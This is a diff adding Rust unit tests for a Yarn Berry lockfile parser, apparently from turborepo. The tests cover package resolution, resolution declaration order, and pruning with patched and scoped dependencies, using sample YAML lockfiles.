+  version: 0.0.0-use.local
+  resolution: "buffer@workspace:packages/buffer"
+  languageName: unknown
+  linkType: soft
+
+"ieee754@npm:^1.2.1":
+  version: 1.2.1
+  resolution: "ieee754@npm:1.2.1"
+  checksum: 10c0-ghi789
+  languageName: node
+  linkType: hard
+"#;
+
+        let data = LockfileData::from_bytes(yaml.as_bytes()).unwrap();
+        let lockfile = BerryLockfile::new(data, None).unwrap();
+
+        // Resolving "buffer" with version "npm:buffer@6.0.3" from workspace "a"
+        // should return the npm package, not the workspace.
+        let resolved = lockfile
+            .resolve_package("packages/a", "buffer", "npm:buffer@6.0.3")
+            .unwrap();
+        assert!(resolved.is_some(), "should resolve the npm alias package");
+        let pkg = resolved.unwrap();
+        assert_eq!(pkg.key, "buffer@npm:6.0.3");
+        assert_eq!(pkg.version, "6.0.3");
+
+        // Pruning for workspace "a" should include the npm buffer package
+        let subgraph = lockfile
+            .subgraph(
+                &["packages/a".to_string()],
+                &["buffer@npm:6.0.3".to_string()],
+            )
+            .unwrap();
+        let encoded = String::from_utf8(subgraph.encode().unwrap()).unwrap();
+        assert!(
+            encoded.contains("buffer@npm:buffer@6.0.3"),
+            "pruned lockfile should contain the npm alias entry"
+        );
+    }
+
+    #[test]
+    fn test_resolution_declaration_order_is_preserved() {
+        // Regression test for https://github.com/vercel/turborepo/issues/14040
+        let yaml = r#"__metadata:
+  version: 8
+
+"root@workspace:.":
+  version: 0.0.0-use.local
+  resolution: "root@workspace:."
+  dependencies:
+    child: "npm:^1.0.0"
+  languageName: unknown
+  linkType: soft
+
+"child@npm:^1.0.0":
+  version: 1.0.0
+  resolution: "child@npm:1.0.0"
+  languageName: node
+  linkType: hard
+
+"child@npm:1.0.0":
+  version: 1.0.0
+  resolution: "child@npm:1.0.0"
+  languageName: node
+  linkType: hard
+
+"child@npm:2.0.0":
+  version: 2.0.0
+  resolution: "child@npm:2.0.0"
+  languageName: node
+  linkType: hard
+"#;
+
+        let assert_resolution = |manifest_json: &str, expected: &str| {
+            let manifest: BerryManifest = serde_json::from_str(manifest_json).unwrap();
+            let data = LockfileData::from_bytes(yaml.as_bytes()).unwrap();
+            let lockfile = BerryLockfile::new(data, Some(manifest)).unwrap();
+
+            let resolved = lockfile
+                .resolve_package(".", "child", "npm:^1.0.0")
+                .unwrap()
+                .unwrap();
+            assert_eq!(resolved.key, format!("child@npm:{expected}"));
+
+            let dependencies = lockfile
+                .all_dependencies("root@workspace:.")
+                .unwrap()
+                .unwrap();
+            assert_eq!(
+                dependencies.get("child").unwrap(),
+                &format!("npm:{expected}")
+            );
+        };
+
+        // issue #14040 declares the parent-specific selector first
+        assert_resolution(
+            r#"{"resolutions":{"root/child":"2.0.0","child":"1.0.0"}}"#,
+            "2.0.0",
+        );
+        // Reversing declaration order makes the generic selector win.
+        assert_resolution(
+            r#"{"resolutions":{"child":"1.0.0","root/child":"2.0.0"}}"#,
+            "1.0.0",
+        );
+    }
+
+    #[test]
+    fn test_prune_preserves_babel_parser_package_extension() {
+        let yaml = r#"__metadata:
+  version: 8
+  cacheKey: 10c0
+
+"app@workspace:packages/app":
+  version: 0.0.0-use.local
+  resolution: "app@workspace:packages/app"
+  dependencies:
+    "@babel/template": "npm:^7.28.6"
+  languageName: unknown
+  linkType: soft
+
+"@babel/parser@npm:^7.28.6":
+  version: 7.29.0
+  resolution: "@babel/parser@npm:7.29.0"
+  languageName: node
+  linkType: hard
+
+"@babel/template@npm:^7.28.6":
+  version: 7.29.0
+  resolution: "@babel/template@npm:7.29.0"
+  dependencies:
+    "@babel/parser": "npm:^7.28.6"
+    "@babel/types": "npm:^7.28.6"
+  languageName: node
+  linkType: hard
+
+"@babel/types@npm:^7.28.6, @babel/types@npm:^7.8.3":
+  version: 7.29.0
+  resolution: "@babel/types@npm:7.29.0"
+  languageName: node
+  linkType: hard
+
+"root@workspace:.":
+  version: 0.0.0-use.local
+  resolution: "root@workspace:."
+  languageName: unknown
+  linkType: soft
+"#;
+
+        let data = LockfileData::from_bytes(yaml.as_bytes()).unwrap();
+        let lockfile = BerryLockfile::new(data, None).unwrap();
+        let with_parser = lockfile
+            .subgraph(
+                &["packages/app".to_string()],
+                &[
+                    "@babel/parser@npm:7.29.0".to_string(),
+                    "@babel/template@npm:7.29.0".to_string(),
+                    "@babel/types@npm:7.29.0".to_string(),
+                ],
+            )
+            .unwrap();
+        let without_parser = lockfile
+            .subgraph(&[], &["@babel/types@npm:7.29.0".to_string()])
+            .unwrap();
+
+        assert!(
+            String::from_utf8(with_parser.encode().unwrap())
+                .unwrap()
+                .contains("@babel/types@npm:^7.8.3")
+        );
+        assert!(
+            !String::from_utf8(without_parser.encode().unwrap())
+                .unwrap()
+                .contains("@babel/types@npm:^7.8.3")
+        );
+    }
+
+    #[test]
+    fn test_prune_with_patch_resolution() {
+        // Regression test for https://github.com/vercel/turborepo/issues/3273
+        // Berry lockfiles with patched dependencies via resolutions should
+        // prune correctly without panicking.
+        //
+        // When a resolution override points to a patch, the lockfile entry
+        // for the unpatched package uses the resolved version (not the range)
+        // because yarn resolves the override before writing the lockfile.
+        let yaml = r#"__metadata:
+  version: 6
+  cacheKey: 8c0
+
+"root@workspace:.":
+  version: 0.0.0-use.local
+  resolution: "root@workspace:."
+  languageName: unknown
+  linkType: soft
+
+"a@workspace:packages/a":
+  version: 0.0.0-use.local
+  resolution: "a@workspace:packages/a"
+  dependencies:
+    lodash: ^4.17.21
+  languageName: unknown
+  linkType: soft
+
+"lodash@npm:4.17.21":
+  version: 4.17.21
+  resolution: "lodash@npm:4.17.21"
+  checksum: abc123
+  languageName: node
+  linkType: hard
+
+"lodash@patch:lodash@npm%3A4.17.21#./.yarn/patches/lodash-npm-4.17.21-6382451519.patch::locator=root%40workspace%3A.":
+  version: 4.17.21
+  resolution: "lodash@patch:lodash@npm%3A4.17.21#./.yarn/patches/lodash-npm-4.17.21-6382451519.patch::version=4.17.21&hash=2c6e9e&locator=root%40workspace%3A."
+  checksum: def456
+  languageName: node
+  linkType: hard
+"#;
+
+        let resolutions: HashMap<String, String> = HashMap::from([(
+            "lodash@^4.17.21".to_string(),
+            "patch:lodash@npm%3A4.17.21#./.yarn/patches/lodash-npm-4.17.21-6382451519.patch"
+                .to_string(),
+        )]);
+        let manifest = BerryManifest::with_resolutions(resolutions);
+        let data = LockfileData::from_bytes(yaml.as_bytes()).unwrap();
+        let lockfile = BerryLockfile::new(data, Some(manifest)).unwrap();
+
+        let result = lockfile.subgraph(
+            &["packages/a".to_string()],
+            &["lodash@npm:4.17.21".to_string()],
+        );
+        assert!(
+            result.is_ok(),
+            "subgraph should not panic or error: {:?}",
+            result.err()
+        );
+        let pruned = result.unwrap();
+        let encoded = String::from_utf8(pruned.encode().unwrap()).unwrap();
+        assert!(
+            encoded.contains("lodash@npm:4.17.21"),
+            "pruned lockfile should contain lodash"
+        );
+    }
+
+    #[test]
+    fn test_prune_with_scoped_patch_resolution() {
+        // Regression test for https://github.com/vercel/turborepo/issues/3273
+        // Scoped packages with patches (e.g. @google-cloud/datastore) should
+        // work correctly during prune.
+        let yaml = r#"__metadata:
+  version: 6
+  cacheKey: 8c0
+
+"root@workspace:.":
+  version: 0.0.0-use.local
+  resolution: "root@workspace:."
+  languageName: unknown
+  linkType: soft
+
+"a@workspace:packages/a":
+  version: 0.0.0-use.local
+  resolution: "a@workspace:packages/a"
+  dependencies:
+    "@google-cloud/datastore": ^7.0.0
+  languageName: unknown
+  linkType: soft
+
+"@google-cloud/datastore@npm:7.0.0":
+  version: 7.0.0
+  resolution: "@google-cloud/datastore@npm:7.0.0"
+  checksum: abc123
+  languageName: node
+  linkType: hard
+
+"@google-cloud/datastore@patch:@google-cloud/datastore@npm%3A7.0.0#./.yarn/patches/@google-cloud-datastore-npm-7.0.0-994584c630.patch::locator=root%40workspace%3A.":
+  version: 7.0.0
+  resolution: "@google-cloud/datastore@patch:@google-cloud/datastore@npm%3A7.0.0#./.yarn/patches/@google-cloud-datastore-npm-7.0.0-994584c630.patch::version=7.0.0&hash=abc123&locator=root%40workspace%3A."
+  checksum: def456
+  languageName: node
+  linkType: hard
+"#;
+
+        let resolutions: HashMap<String, String> = HashMap::from([(
+            "@google-cloud/datastore@^7.0.0".to_string(),
+            "patch:@google-cloud/datastore@npm%3A7.0.0#./.yarn/patches/@\
+             google-cloud-datastore-npm-7.0.0-994584c630.patch"
+                .to_string(),
+        )]);
+        let manifest = BerryManifest::with_resolutions(resolutions);
+        let data = LockfileData::from_bytes(yaml.as_bytes()).unwrap();
+        let lockfile = BerryLockfile::new(data, Some(manifest)).unwrap();
+
+        let result = lockfile.subgraph(
+            &["packages/a".to_string()],
+            &["@google-cloud/datastore@npm:7.0.0".to_string()],
+        );
+        assert!(
+            result.is_ok(),
+            "subgraph should not panic or error: {:?}",
+            result.err()
+        );
+    }
+
+    #[test]
+    fn test_prune_with_missing_patch_descriptor_returns_error() {
+        let yaml = r#"__metadata:
+  version: 6
+  cacheKey: 8c0
+
+"root@workspace:.":
+  version: 0.0.0-use.local
+  resolution: "root@workspace:."
+  languageName: unknown
+  linkType: soft
+
+"lodash@npm:4.17.21":
+  version: 4.17.21
+  resolution: "lodash@npm:4.17.21"
+  checksum: abc123
+  languageName: node
+  linkType: hard
+
+"lodash@patch:lodash@npm%3A4.17.21#./.yarn/patches/lodash.patch::locator=root%40workspace%3A.":
+  version: 4.17.21
+  resolution: "lodash@patch:lodash@npm%3A4.17.21#./.yarn/patches/lodash.patch::version=4.17.21&hash=abc123&locator=root%40workspace%3A."
+  checksum: def456
+  languageName: node
+  linkType: hard
+"#;
+
+        let data = LockfileData::from_bytes(yaml.as_bytes()).unwrap();
+        let lockfile = BerryLockfile::new(data, None).unwrap();
+        let pruned = lockfile
+            .subgraph(&[], &["lodash@npm:4.17.21".to_string()])
+            .unwrap();
+
+        let err = pruned
+            .subgraph(&[], &["lodash@npm:4.17.21".to_string()])
+            .unwrap_err();
+        assert!(matches!(err, Error::MissingDescriptorsForPatchLocator(_)));
+    }
+
+    #[test]
+    fn test_prune_with_malformed_patch_descriptor_returns_error() {
+        let yaml = r#"__metadata:
+  version: 6
+  cacheKey: 8c0
+
+"root@workspace:.":
+  version: 0.0.0-use.local
+  resolution: "root@workspace:."
+  languageName: unknown
+  linkType: soft
+
+"lodash@npm:4.17.21":
+  version: 4.17.21
+  resolution: "lodash@npm:4.17.21"
+  checksum: abc123
+  languageName: node
+  linkType: hard
+
+"lodash@npm:not-a-patch-descriptor":
+  version: 4.17.21
+  resolution: "lodash@patch:lodash@npm%3A4.17.21#./.yarn/patches/lodash.patch::version=4.17.21&hash=abc123&locator=root%40workspace%3A."
+  checksum: def456
+  languageName: node
+  linkType: hard
+"#;
+
+        let data = LockfileData::from_bytes(yaml.as_bytes()).unwrap();
+        let lockfile = BerryLockfile::new(data, None).unwrap();
+
+        let err = lockfile
+            .subgraph(&[], &["lodash@npm:4.17.21".to_string()])
+            .unwrap_err();
+        assert!(matches!(err, Error::InvalidPatchDescriptor { .. }));
+    }
+
+    #[test]
+    fn test_all_dependencies_with_invalid_descriptor_returns_error() {
+        let yaml = r#"__metadata:
+  version: 6
+  cacheKey: 8c0
+
+"root@workspace:.":
+  version: 0.0.0-use.local
+  resolution: "root@workspace:."
+  languageName: unknown
+  linkType: soft
+
+"a@workspace:packages/a":
+  version: 0.0.0-use.local
+  resolution: "a@workspace:packages/a"
+  languageName: unknown
+  linkType: soft
+"#;
+
+        let data = LockfileData::from_bytes(yaml.as_bytes()).unwrap();
+        let mut lockfile = BerryLockfile::new(data, None).unwrap();
+        let locator = Locator::try_from("a@workspace:packages/a")
+            .unwrap()
+            .as_owned();
+        let package = lockfile.locator_package.get_mut(&locator).unwrap();
+        package.dependencies = Some(Map::from([(
+            "bad/name".to_string(),
+            "npm:^1.0.0".to_string(),
+        )]));
+
+        let err = lockfile
+            .all_dependencies("a@workspace:packages/a")
+            .unwrap_err();
+        assert!(matches!(err, crate::Error::Berry(Error::Identifiers(_))));
+    }
+
+    #[test]
+    fn test_berry_manifest_into_parts_merges_correctly() {
+        let mut default_catalog = Map::new();
+        default_catalog.insert("lodash".to_string(), "^4.17.21".to_string());
+
+        let mut react_catalog = Map::new();
+        react_catalog.insert("react".to_string(), "^18.2.0".to_string());
+
+        let mut named_catalogs = Map::new();
+        named_catalogs.insert("react18".to_string(), react_catalog);
+
+        let manifest = BerryManifest {
+            resolutions: None,
+            catalog: Some(default_catalog),
+            catalogs: Some(named_catalogs),
+            package_extensions: None,
+        };
+
+        let (overrides, all_catalogs, package_extensions) = manifest.into_parts().unwrap();
+        assert!(package_extensions.is_empty());
+
+        // No resolutions, so overrides should be empty
+        assert!(overrides.is_empty());
+
+        // Should have both default and named
+        assert_eq!(all_catalogs.len(), 2);
+        assert!(all_catalogs.contains_key("default"));
+        assert!(all_catalogs.contains_key("react18"));
+
+        assert_eq!(
+            all_catalogs.get("default").and_then(|c| c.get("lodash")),
+            Some(&"^4.17.21".to_string())
+        );
+        assert_eq!(
+            all_catalogs.get("react18").and_then(|c| c.get("react")),
+            Some(&"^18.2.0".to_string())
+        );
+    }
+}
